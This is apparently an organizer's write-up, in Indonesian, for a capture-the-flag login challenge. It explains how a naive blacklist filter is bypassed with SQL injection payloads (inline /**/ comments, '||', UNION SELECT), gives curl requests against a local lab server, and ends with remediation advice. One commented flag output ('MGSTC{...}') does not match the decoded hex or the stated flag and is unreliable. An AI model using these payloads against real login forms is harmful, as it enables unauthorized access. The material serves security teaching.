# Writeup (Panitia) - Filtered Login

## Vulnerability
SQL Injection yang sama seperti "Baby Login", tapi kali ini ada filter naif di server:

```python
BLOCKED_PATTERNS = [" or ", "\tor\t", "\nor\n"]

def contains_blocked_pattern(text: str) -> bool:
    lowered = text.lower()
    return any(pat in lowered for pat in BLOCKED_PATTERNS)
```

Filter ini hanya mendeteksi substring literal `" or "` (dengan spasi/tab/newline di kedua sisi), case-insensitive. Ini adalah contoh klasik **blacklist filter yang tidak lengkap** — mudah dilewati karena hanya mencocokkan satu representasi string, bukan memahami semantik SQL.

## Exploitation

### Payload yang DIBLOKIR
```
admin' OR '1'='1
```
Ditolak karena mengandung `" or "` (dengan spasi).

### Payload bypass
Ganti spasi di sekitar `OR` dengan komentar SQL inline `/**/` (valid sebagai whitespace di MySQL/SQLite):

**Username:**
```
admin'/**/OR/**/'1'='1
```
**Password:** apa saja, misalnya `x`

Query yang terbentuk di server:
```sql
SELECT id, username, role FROM users WHERE username = 'admin'/**/OR/**/'1'='1' AND password = 'x'
```
String `admin'/**/OR/**/'1'='1` **tidak** mengandung `" or "` (tidak ada spasi literal di sekitar `OR`), sehingga lolos filter. Tapi secara SQL, `/**/` berfungsi sama seperti spasi, sehingga query tetap valid dan kondisi `OR '1'='1'` tetap membuat `WHERE` selalu benar.

### Payload bypass lain yang juga valid
- `admin'||'` (operator concatenation, tidak memakai kata OR sama sekali, hanya berlaku jika backend mendukung `||` seperti SQLite/PostgreSQL)
- `admin' union select 1,'admin','admin'-- -` (tidak mengandung kata OR sama sekali)
- Tab/newline literal di antara kata: `admin'\tOR\t'1'='1` — namun di challenge ini sudah diblokir juga lewat `BLOCKED_PATTERNS`, untuk mengajarkan bahwa filter harus mencakup semua representasi whitespace

### Contoh request (curl)
```bash
# 1. Login dengan payload bypass filter, simpan session
curl -c cookies.txt -X POST http://localhost:5000/login \
  --data-urlencode "username=admin'/**/OR/**/'1'='1" \
  --data-urlencode "password=x"

# 2. Akses admin settings
curl -b cookies.txt http://localhost:5000/admin-settings
```

Halaman `/admin-settings` menampilkan string **hex**:
```
4354467b66316c7433725f6279703473735f63306d6d336e745f747231636b7d
```

Decode hex untuk mendapat flag asli:
```bash
echo "4354467b66316c7433725f6279703473735f63306d6d336e745f747231636b7d" | xxd -r -p
# atau pakai python:
python3 -c "print(bytes.fromhex('4354467b66316c7433725f6279703473735f63306d6d336e745f747231636b7d').decode())"
# MGSTC{f1lt3r_byp4ss_c0mm3nt_tr1ck}
```

## Root Cause
1. SQL Injection dasar: string concatenation, bukan parameterized query.
2. Filter keamanan berbasis **blacklist string literal**, bukan validasi/parsing yang benar — klasik "security by pattern matching" yang gagal menutup semua variasi sintaks SQL (whitespace alternatif, operator alternatif, encoding berbeda, dll).

## Remediasi (untuk pembelajaran)
- Gunakan parameterized query (`?` placeholder), **bukan** filter blacklist.
- Kalau terpaksa perlu filter tambahan (defense in depth), gunakan **whitelist** karakter yang diizinkan, bukan blacklist kata kunci.
- WAF/filter tidak pernah jadi pengganti query yang aman secara desain.

## Flag
```
CTF{f1lt3r_byp4ss_c0mm3nt_tr1ck}
```
(Diatur via environment variable `FLAG` — ganti sebelum event berlangsung.)
